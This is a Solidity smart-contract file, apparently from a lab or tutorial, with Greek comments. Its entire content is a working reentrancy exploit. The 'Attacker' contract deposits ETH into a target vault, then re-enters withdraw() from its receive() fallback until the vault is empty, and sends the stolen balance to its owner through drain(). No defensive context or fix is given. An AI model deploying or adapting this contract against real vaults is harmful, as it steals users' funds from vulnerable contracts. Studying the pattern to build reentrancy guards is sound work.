// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEtherVault {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IEtherVault public victim;
    address payable public owner;
    uint256 public attackAmount;

    constructor(address _victim) {
        victim = IEtherVault(_victim);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        attackAmount = msg.value;

        // Step 1: γίνομαι "νόμιμος" χρήστης με valid balance
        victim.deposit{value: attackAmount}();

        // Step 2: ξεκινάει το loop
        victim.withdraw(attackAmount);
    }

    receive() external payable {
        // Όσο το vault έχει αρκετά να δώσει, ξανακαλώ withdraw
        if (address(victim).balance >= attackAmount) {
            victim.withdraw(attackAmount);
        }
    }

    function drain() external {
        require(msg.sender == owner, "Not owner");
        owner.transfer(address(this).balance);
    }

    function stolen() external view returns (uint256) {
        return address(this).balance;
    }
}
